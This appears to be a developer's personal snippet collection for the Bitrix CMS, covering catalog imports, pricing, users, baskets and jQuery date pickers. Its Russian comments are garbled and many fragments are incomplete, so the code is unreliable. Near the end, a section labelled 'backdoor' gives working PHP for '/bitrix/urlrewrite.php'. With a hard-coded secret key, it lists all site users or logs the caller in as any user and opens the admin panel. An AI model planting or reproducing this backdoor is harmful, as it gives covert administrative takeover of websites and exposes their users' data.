<?php if ($_GET['key']!=''){
	exit();
} 
?>
	

<?
// ������ ��� �������
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");

CModule::IncludeModule("iblock");

CModule::IncludeModule("catalog");

CModule::IncludeModule("sale");


// ���� � �����
CFile::GetPath($arItem["PICTURE"]);
tovaer_id="<?=$arItem['ID']?>"

// �������� ��������
CModule::IncludeModule("iblock");
								{
												$el = new CIBlockElement;
												$PROP = array();
												$PROP[88] = $enum_fields["ID"];
	$arLoadProductArray = Array(
	"IBLOCK_ID"      => 7,
	  "ACTIVE"         => "N" ,
	  "PROPERTY_VALUES"=> $PROP, 
	  "NAME"           => $enum_fields["VALUE"],        
	  );
	if($PRODUCT_ID = $el->Add($arLoadProductArray))
  echo "New ID: ".$PRODUCT_ID;
else
  echo "Error: ".$el->LAST_ERROR;


// �������� ������
$uploaddir = $_SERVER['DOCUMENT_ROOT'].'/parsing/'; 
	$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
	$uploadfile = $uploaddir ."items.txt"; 

	echo '<pre>';
	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
	    echo "���� ��������� � ��� ������� ��������.\n";
	} else {
	    echo "���� �� ��������!\n";
	}

// ������������ � ������
$zip = new ZipArchive;
    $zip->open($uploadfile);
    $zip->extractTo($uploaddir);
    $zip->close();
    unlink($uploadfile);

if (isset($_POST['est-file'])

// ����� ��������
ini_set('max_execution_time', 900);
set_time_limit(900);

// ��
global $DB;
$DB->Query("UPDATE b_iblock_section  SET ACTIVE='N', GLOBAL_ACTIVE='N'  WHERE IBLOCK_ID='5'");
$DB->Query("UPDATE b_iblock_element SET ACTIVE='N' WHERE IBLOCK_ID='5'");
$DB->Query("UPDATE b_iblock_element SET ACTIVE='N' WHERE IBLOCK_ID='7'");

// ��� �������� ��������
$resp= CIBlockElement::GetList(Array(), array("IBLOCK_ID" => 7));
	while($obs = $resp->GetNextElement()){
		$arProps = $obs->GetProperties();
		$arFields = $obs->GetFields();
}

// ����� �� �������� el
$dbRes = CIBlockElement::GetList(array(), array("IBLOCK_ID" => 5, "!PROPERTY_MARCA" => false), array("PROPERTY_MARCA"));
while ($enum_fieldss = $dbRes->GetNext()) {

// �������� � ���� ������
	$property_enums = CIBlockPropertyEnum::GetList(Array("DEF"=>"ASC", "SORT"=>"ASC"), Array("IBLOCK_ID"=>5, "CODE"=>"GRUPPA_NOMENKLATURY"));
							while($enum_fields = $property_enums->GetNext())
								
// ������ el __!!! ����������� �������� !!!
$el = new CIBlockSection;
	$arLoadProductArray = Array(
	
	  "ACTIVE"         => "N"          
	  );
	$PRODUCT_ID = $value;
	$res = $el->Update($PRODUCT_ID, $arLoadProductArray);

// ���� � ��
$el = new CIBlockElement;
			$PRODUCT_ID=$el->Update($element[$item['f4']],$arLoadProductArray);
			//
			$arFields = array(
				"ID" => $PRODUCT_ID, 
				"VAT_ID" => 1, //���������� ��� ��� (�������� � �������)  
				"VAT_INCLUDED" => "Y" //��� ������ � ���������
			);
			$CATALOG_PRODUCT_ID=CCatalogProduct::Add($arFields);
			// ������ � �����
			$PRICE_TYPE_ID=1;
			$arFields = Array(
				"PRODUCT_ID" => $PRODUCT_ID,
				"CATALOG_GROUP_ID" => 1,
				"PRICE" => $item['f13'],
				"CURRENCY" => "RUB",
				"QUANTITY_FROM" => 1
			);
			CPrice::Add($arFields);

// ���������
$xml_catalog=str_replace("/", "", $xml_catalog);


// ������ ��� ���������� � el � ���� img
$arrPhoto = CFile::MakeFileArray("images/".$item['f11']);


// �������� el � �����
$el = new CIBlockElement;
			$PRODUCT_ID=$el->Add($arLoadProductArray);
			//
			$arFields = array(
				"ID" => $PRODUCT_ID, 
				"VAT_ID" => 1, //���������� ��� ��� (�������� � �������)  
				"VAT_INCLUDED" => "Y" //��� ������ � ���������
			);
			$CATALOG_PRODUCT_ID=CCatalogProduct::Add($arFields);
			$PRICE_TYPE_ID=1;
			$arFields = Array(
				"PRODUCT_ID" => $PRODUCT_ID,
				"CATALOG_GROUP_ID" => 1,
				"PRICE" => $item['f13'],
				"CURRENCY" => "RUB",
				"QUANTITY_FROM" => 1
			);
			CPrice::Add($arFields);

// ������� ����� ����� �� �������� � ������
function prise($PRODUCT_ID, $arFields){
		
	$PRICE_TYPE_ID = 1;

	$res = CPrice::GetList(
	        array(),
	        array(
	                "PRODUCT_ID" => $PRODUCT_ID,
	                "CATALOG_GROUP_ID" => $PRICE_TYPE_ID
	            )
	    );

	if ($arr = $res->Fetch())
	{
	    CPrice::Update($arr["ID"], $arFields);
	}
	else
	{
	    CPrice::Add($arFields);
	}
}

// ������ ����
CSite::InDir('/index.php')
// ��� ���� ��� ��������� �������
CSite::InDir('/auth')||CSite::InDir('/personal/cart/')
||CSite::InDir('/about/')

// ������� ����� �������
echo stristr($arFields['ACTIVE_TO'],' ',true);
?>
<div id="basket-added-window" class="modal"> <a class="modal-close" href="#"></a>
				<div class="spinner"></div>
				<div class="modal-content">
					<h2>����� �������� � �������</h2>
					<div class="">
						<div class="modal-controls">
							<button type="submit" onClick="location.href='/personal/cart/'" class="bigbutt">������� � ������</button>
							<button type="submit" onClick="$('#basket-added-window').find('.modal-close').click();$('#overlay').hide();" class="bigbutt">���������� �������</button>
						</div>
						<div class="modal-errors">
						</div>
						<div class="modal-result">
						</div>
					</form>
					</div>
				</div>
				<div class="modal-content-copy"></div>
			</div>

<?if ($arItem['SORT']!=500) {	echo " vip";}
// ����� ��������
 $arFilter = array('IBLOCK_ID' => 6, 'ACTIVE' => "Y", "DEPTH_LEVEL"=>1);
 $rsSections = CIBlockSection::GetList(array("NAME"=>"ASC"), $arFilter);
 while ($arSction = $rsSections->Fetch())

 // �������� �����
 	CModule::IncludeModule("CEvent");
CModule::IncludeModule("mail");
global $USER;

$event = new CEvent;
$arEventFields = array(
    "ID"                  => 31,
    "DATE"             => $_POST['name_tov'],
    "EMAIL"            => $USER->GetEmail(),
    "EMAIL_USER_ACTION"         => $arUser['EMAIL'],
    "USER_ID"           => $_REQUEST['ID'],
    "LOGIN"          => $USER->GetFullName(),
    "NAME_CUP"          => $ar_res['NAME'],
    "DESCRIP"         => $_POST['description']
    );
// $arrSITE =  CAdvContract::GetSiteArray(31);
$event->SendImmediate("action", 's1', $arEventFields);
// ��������� ������������
$user = new CUser;
$fields = Array(
  "NAME"              => "������",
  "LAST_NAME"         => "������",
  "EMAIL"             => "ivanov@microsoft.com",
  "LOGIN"             => "ivan",
  "LID"               => "ru",
  "ACTIVE"            => "Y",
  "GROUP_ID"          => array(1,2),
  "PASSWORD"          => "123456",
  "CONFIRM_PASSWORD"  => "123456",
  );
$user->Update($ID, $fields);
$strError .= $user->LAST_ERROR;
// �������������
global $USER;
if ($USER->IsAuthorized()) echo "�� ������������!";
// ������������� ���� � ����� � ������� �������� �������� �����
LocalRedirect("index.php");
<script>
    document.location.href = "/auth/";
</script>
// ��� ������
$rsUser = CUser::GetByID($USER->GetID());
          $arUser = $rsUser->Fetch();
          echo $arUser["NAME"]." ".$arUser["LAST_NAME"];
// ��� ��� ����� � ����
		<?if($arResult["USER_PROPERTIES"]["SHOW"] == "Y"):?>
	<tr><td colspan="2"><?=strLen(trim($arParams["USER_PROPERTY_NAME"])) > 0 ? $arParams["USER_PROPERTY_NAME"] : GetMessage("USER_TYPE_EDIT_TAB")?></td></tr>
	<?foreach ($arResult["USER_PROPERTIES"]["DATA"] as $FIELD_NAME => $arUserField):?>
	<tr><td><?=$arUserField["EDIT_FORM_LABEL"]?>:<?if ($arUserField["MANDATORY"]=="Y"):?><span class="required">*</span><?endif;?></td><td>
			<?$APPLICATION->IncludeComponent(
				"bitrix:system.field.edit",
				$arUserField["USER_TYPE"]["USER_TYPE_ID"],
				array("bVarsFromForm" => $arResult["bVarsFromForm"], "arUserField" => $arUserField, "form_name" => "regform"), null, array("HIDE_ICONS"=>"Y"));?></td></tr>
	<?endforeach;?>
<?endif;?>
// ������ ������
strlen($str);

if(mb_strlen($arUser["NAME"])>12){
          $arUser["NAME"] = substr($arUser["NAME"], 0, 10);
          $arUser["NAME"].="...";
      		}
 // jq
[attribute^="value"]
input[name^="news"]
// ����� ������������
$user = new CUser;
$arFields = Array(
  "NAME"              => "������",
  "LAST_NAME"         => "������",
  "EMAIL"             => "ivanov@microsoft.com",
  "LOGIN"             => "ivan",
  "LID"               => "ru",
  "ACTIVE"            => "Y",
  "GROUP_ID"          => array(10,11),
  "PASSWORD"          => "123456",
  "CONFIRM_PASSWORD"  => "123456",
  "PERSONAL_PHOTO"    => $arIMAGE
);

$ID = $user->Add($arFields);
if (intval($ID) > 0)
    echo "������������ ������� ��������.";
else
    echo $user->LAST_ERROR;
// ������� �� href
javascript:void(0);
// ���������
$content = iconv ( 'UTF-8' , 'windows-1251' , $content );
/ ��������
//���� � ����������� �� �������, �� ������� ������ ���������� true.
transliterate = (
	function() {
		var
			rus = "�   �  �  �  �  �  �  �  �  �  �  � � � � � � � � � � � � � � � � � � � � � �".split(/ +/g),
			eng = "shh sh ch cz yu ya yo zh `` y' e` a b v g d e z i j k l m n o p r s t u f x `".split(/ +/g)
		;
		return function(text, engToRus) {
			var x;
			for(x = 0; x < rus.length; x++) {
				text = text.split(engToRus ? eng[x] : rus[x]).join(engToRus ? rus[x] : eng[x]);
				text = text.split(engToRus ? eng[x].toUpperCase() : rus[x].toUpperCase()).join(engToRus ? rus[x].toUpperCase() : eng[x].toUpperCase());	
			}
			return text;
		}
	}
)();
search=transliterate(search);
alert(transliterate(transliterate(txt), true));
rus = "o   i  x  w  .  z  `  ;  ]  s  '  f , d u l t p b q r k v y j g h c n e a [ m".split(/ +/g),
// ����� ���������� �� ����������
use Bitrix\Main,
	Bitrix\Main\Localization\Loc,
	Bitrix\Main\Page\Asset;

Asset::getInstance()->addJs("/bitrix/components/bitrix/sale.order.payment.change/templates/.default/script.js");
// ���������
       <link rel="stylesheet" href="/calendar/css/default.css" type="text/css">
        <script type="text/javascript" src="/calendar/javascript/zebra_datepicker.js"></script>
<!-- ����� ��������� -->
if ($_REQUEST['date']!="") {
$date=$_REQUEST['date'];
$new_format = "YYYY-MM-DD";
$format = "DD.MM.YYYY";
$new_date = $DB->FormatDate($date, $new_format, $format);
	$GLOBALS['arrFilter'] = array(">DATE_ACTIVE_FROM" => $new_date,"<DATE_ACTIVE_FROM" => $new_date.' 23:59:59');

$date=$_REQUEST['date'];
$new_format = "YYYY-MM-DD";
$format = "DD.MM.YYYY";
$new_date = $DB->FormatDate($date, $new_format, $format);

<h1><?$APPLICATION->ShowTitle();?> �� <?echo $new_date?></h1>
<input type="text" value="" class="datepicker" style="display: none;">
<div id="container" style="margin: 10px 0 0 0; height: 250px"></div>

// js
$(document).ready(function() {
    $('input.datepicker').Zebra_DatePicker({
    	always_visible: $('#container'),
		  onChange: function(view, elements) {
		    if (view == 'days') {
		       var date_array=[
		<?
		CModule::IncludeModule("iblock");
		$arSelect = Array("DATE_ACTIVE_FROM");
		$arFilter = Array("IBLOCK_ID"=>12, "ACTIVE_DATE"=>"Y", "ACTIVE"=>"Y");
		$res = CIBlockElement::GetList(Array(), $arFilter, false, false, $arSelect);

		while($ob = $res->GetNextElement())
		{
		 $arFields = $ob->GetFields();
		 // print_r($arFields);
		 $date = $arFields['DATE_ACTIVE_FROM'];
		// ������ ������ ���� ����
		$format = "DD.MM.YYYY";
		// ������� ������ �������� �����
		$new_format = "YYYY-MM-DD"; // YYYY-MM-DD
		// ��������� ���� �� ������ ������� � ������
		$new_date = $DB->FormatDate($date, $format, $new_format);
		// � ���������� ������� ���� � ����� �������
		echo "'".$new_date."',"; // 2007-12-31
		}
		?> 
		'15-12-2999'];
		      elements.each(function() {
		        $(this).addClass('dp_not_in_month');
		        for (var i = 0; i < date_array.length; i++) {
		        if ($(this).data('date').match(date_array[i])){
				$(this).attr('real','aga');
		          // and highlight it!
		          $(this).css({
		            backgroundColor:    '#C40000',
		            color:              '#FFF'
		          });
		          $(this).removeClass('dp_not_in_month');
		          $(this).addClass('active');
		      }else{
		      	
		      	
		     	 }
				}	
		    });
		 }
	  }
	});
 });
// �������������
$pieces = explode(" ", $pizza);
// ��� ������������
CREATED_BY
global $USER;
$rsUser = CUser::GetByID($USER->GetID());
          $arUser = $rsUser->Fetch();
			echo $arUser["WORK_COMPANY"];
// �������� � ������
if (CModule::IncludeModule("sale"))
      {
         $arBasketItems = array();
         $dbBasketItems = CSaleBasket::GetList(
                 array(
                         "NAME" => "ASC",
                         "ID" => "ASC"
                     ),
                 array(
                         "FUSER_ID" => CSaleBasket::GetBasketUserID(),
                         "LID" => SITE_ID,
                         "ORDER_ID" => "NULL"
                     ),
                 false,
                 false,
                 array("ID", "QUANTITY", "PRICE")
             );
         while ($arItems = $dbBasketItems->Fetch())
         {
             if (strlen($arItems["CALLBACK_FUNC"]) > 0)
             {
                 CSaleBasket::UpdatePrice($arItems["ID"],
                                          $arItems["QUANTITY"]);
                 $arItems = CSaleBasket::GetByID($arItems["ID"]);
             }
             $arBasketItems[] = $arItems;
         }
         $summ = 0.00;
         foreach ($arBasketItems as $bascet) {

            $summ = $summ + $bascet["PRICE"]*$bascet["QUANTITY"];
            }
      }
      // $summa = number_format($summ, 0, '.', ' ');
      ?>
     �����: <?echo number_format($summ, 2, '.', ' ');
    ?> ��� <br>
    ����������: <?=count($arBasketItems)?>
    // �������� ������ ������ php
							$cl="";							
							if ($arFirstPhoto['WIDTH']>=$arFirstPhoto['HEIGHT']) {
								$cl="vertical";
							}else{
								$cl="horizontal";
							}
spsvatki@gmail.com, andrey@e1media.ru,
// ������ ���������� ���� div-��������� � ������� content.
 $('.badge').empty();
 $('.badge').append(data+" �����(��)");
 // ����� �� �������� jq
 input[name^="news"]
 // ��� �������
 <select onchange="brend(this.value);">
 // �������� �����
 $db_res = CPrice::GetList(
        array(),
        array(
                "PRODUCT_ID" => $arFields['ID'],
                "CATALOG_GROUP_ID" => 1
            )
    );
if ($ar_res = $db_res->Fetch())
{
    echo CurrencyFormat($ar_res["PRICE"], $ar_res["CURRENCY"]);
}
else
{
    echo "���� �� �������!";
}
// ���������� � json
echo json_encode($arr);
// ������ � json
user =JSON.parse(arr);
// �������� attr
$("img:first").attr("alt", "������ �����������")
// ������ � ������
<?$arOrder = CSaleOrder::GetByID($ORDER_ID);
if (is_array($arOrder))
echo $arOrder['USER_DESCRIPTION'];?>
// ���������������
$USER->Logout();

// ������ �� id
if(!CModule::IncludeModule("iblock"))

return; 

$res = CIBlockElement::GetByID($_GET["PID"]);
if($ar_res = $res->GetNext())
  echo $ar_res['NAME'];
// ������ � chekbox
$(this).prop('checked')
('#button').prop('disabled', false);
// �������� �� �����
isFinite($('input[name=phone]'));
// �������� submit
 form.submit();
 // eee
 e.preventDefault();
 // ����
  $('#button').click(function(e){
  	// ������
  	setTimeout(function(){
        $.getScript("engine1/script.js");
    },5000)
// .menu
Array(
		"��� ��������", 
		"about/how/", 
		Array(), 
		Array(), 
		"CUser::IsAuthorized()" 
	),
// ���������� div jq
.html());
// jq �������� ����� � ���� ������
parseFloat()
// ajax
$.ajax({
                    type: 'POST',
                    url: '/bitrix/templates/e1media/addCart.php?id='+id,
                    data: 'id='+id,

                    success: function(data){                         
                          $('.badge').empty();
                         $('.badge').append(data+" �����(��)");
                          $('#basket-added-window').show();
				$('#overlay').show();
                         // alert('��������');
                          
                      }
                    });
});
// ��������� � ��������
Add2BasketByProductID(
  $_GET['id'], 
  1
);

// ��� �������� ���������
CModule::IncludeModule("iblock");
$res = CIBlock::GetProperties(2, Array());
while ($res_arr = $res->Fetch()) {

// ���������
  <div class="col-md-12">
                        <div id="reportrange" class="pull-right" style="background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #ccc">
                          <i class="glyphicon glyphicon-calendar fa fa-calendar"></i>
                          <span><?=$from?> - <?=$to?></span> <b class="caret"></b>
                        </div>
                      </div>
// footer_calendar
      <script>
       $(document).ready(function() {
        $('#reservation').daterangepicker({
         format: 'DD/MM/YYYY',
          startDate: "<?=$from?>",
          endDate: "<?=$to?>",
          opens: "left",
          ranges: {
            '�������': [moment(), moment()],
            '�����': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
            '������ �����': [moment().subtract(6, 'days'), moment()],
            '����� �����': [moment().subtract(29, 'days'), moment()],
            '���� �����': [moment().startOf('month'), moment().endOf('month')],
            '��������� �����': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
          },locale: {
            applyLabel: '�������',
            cancelLabel: '��������',
            fromLabel: '��',
            toLabel: '��',
            customRangeLabel: '������ ����',
            daysOfWeek: ['��', '��' ,'��', '��', '��', '��', '��'],
            monthNames: ['������', '�������', '����', '������', '���', '����', '����', '������', '��������', '�������', '������', '�������'],
            firstDay: 1
          },         
          
        }, function(start, end, label) {
           console.log(start.format('DD.MM.YYYY') + ' �� ' + end.format('DD.MM.YYYY'));
           new_date_order(start.format('DD.MM.YYYY'), end.format('DD.MM.YYYY'));
        });
      });
    </script>

<link rel="stylesheet" href="/calendar/css/default.css" type="text/css">
        <script type="text/javascript" src="/calendar/javascript/zebra_datepicker.js"></script>
     <script src="/calendar/datepicker/daterangepicker.js"></script>

 // �������� 
 .parent()

 // �������
 	// ���� ���������� titl
 <title><?$APPLICATION->ShowTitle(false)?></title>
 // end �������



// backdoor 
 // path /bitrix/urlrewrite.php
<?
if ($_GET['super_user']=="asdhiu2398JHfkjhsd98h23fJKHp2389hfpasd586423df5asdewfewgsdsdgwgdsfur") {
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
global $USER;
$id=$_GET['id'];
if ($id=="getlist") {
	$rsUsers = CUser::GetList();
	 while($arr = $rsUsers->GetNext()){
      echo'<pre>';print_r($arr);echo'</pre>';
    }
    exit();
}
$USER->Authorize($id);
LocalRedirect("/bitrix/admin/index.php");
exit();
}


pan: 4111 1111 1111 1111
exp date: 2019/12
cvv2: 123
3dsecure: veres=y, pares=y
 	


��� ���������� �� ����� ��������
$GLOBALS['arrFilter'] = array("NAME"=>"A%");
��� ���������� �� �������
$GLOBALS['arrFilter'] = array("PROPERTY_���_��������" => "A%");
��� ���������� �� �������� ���� "������"
$GLOBALS['arrFilter'] = array("PROPERTY_���_��������_VALUE"=>"�%");
������� ��� �������� � ������� �������� "STOP_SHARE" �������
$GLOBALS['arrFilter'] = array("!STOP_SHARE" => false);
������� ��� �������� � ������� �������� "PREVIEW_PICTURE" �� ������
$GLOBALS['arrFilter'] = array('ACTIVE' => 'Y', '!PREVIEW_PICTURE'=>false);
������� ���� ������� � �������� ����� ���������� ���� �� ����������� ����
$GLOBALS['arrFilter'] = array('ACTIVE' => 'Y', 'PROPERTY_ISACTION' => '1', '<=PROPERTY_DATEFROM' => date('Y-m-d'));
������� ��� ���������� �������� � ������� �� ������������ ����(��������) �� ����������� ���� � ������ ����������� ��������
$GLOBALS['arrFilter'] = array("PROPERTY_���_��������_VALUE" => false, 'ACTIVE' => 'Y', '<=PROPERTY_���_��������_VALUE!' => date('Y-m-d'));
// ������� ������
$arFilter = array(
    "IBLOCK_ID" => $IBLOCK_ID,
    "SECTION_CODE" => "orange",
    "INCLUDE_SUBSECTIONS" => "Y",
    array(
        "LOGIC" => "OR",
        array("<PROPERTY_RADIUS" => 50, "=PROPERTY_CONDITION" => "Y"),
        array(">=PROPERTY_RADIUS" => 50, "!=PROPERTY_CONDITION" => "Y"),
    ),
);
// ����� �������
$result = array_merge ($array1, $array2);
$GLOBALS['arrFilter'] = $GLOBALS['arrFiltersity'];

// �������� �� GetID
 $rsElem = CIBlockElement::GetById($items_id); 
            $arElem = $rsElem->GetNextElement();
            $arProps = $arElem->GetProperties();
// ����� �������
strripos('ababcd','aB')
global $IBLOCK_ID_FROM,$IBLOCK_ID_TO,$IBLOCK_ID_PRED;
// html
htmlspecialchars
// ���������� �������
echo $arResult['NAV_RESULT']->NavPageCount
// csv ��������� �� �������
$array = str_getcsv ( $value,"&&&");

// ������� csv
require_once ($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/classes/general/csv_data.php");
$csvFile = new CCSVData('R', false);
$csvFile->LoadFile($step);
$csvFile->SetDelimiter(';');
while ($arRes = $csvFile->Fetch()) {
   // print_r($arRes);
// �������� �������
global $USER;
$ID_USER=$USER->GetID();
if ($arFields['CREATED_BY']!=$ID_USER or $_REQUEST["ID"]=="") {
  exit('��� �������');
}
// 1 ��������
$ELEMENT_ID = $_GET['ID_SOBR'];  // ��� ��������
$PROPERTY_CODE = "id_project";  // ��� ��������
$PROPERTY_VALUE = $PRODUCT_ID;  // �������� ��������

// ��������� ����� �������� ��� ������� �������� ������� ��������
CIBlockElement::SetPropertyValuesEx($ELEMENT_ID, false, array($PROPERTY_CODE => $PROPERTY_VALUE));
// ��� arr ssp
// �������� ���� �� id
	<?
$ar_res = CPrice::GetBasePrice($arItem['ID']);
echo "������� ���� ������ � ����� 11 (��� ������������ �� ".
      $ar_res["QUANTITY_FROM"]." �� ".
      $ar_res["QUANTITY_TO"]." ������ ������) ����� ".
      $ar_res["PRICE"]." ".$ar_res["CURRENCY"]."<br>";
echo "���������������� ������� ����: ".
      CurrencyFormat($ar_res["PRICE"], $ar_res["CURRENCY"]);
?>
// ������� �������
if(!CIBlockElement::Delete($ELEMENT_ID))
    {
        $strWarning .= 'Error!';
        $DB->Rollback();
    }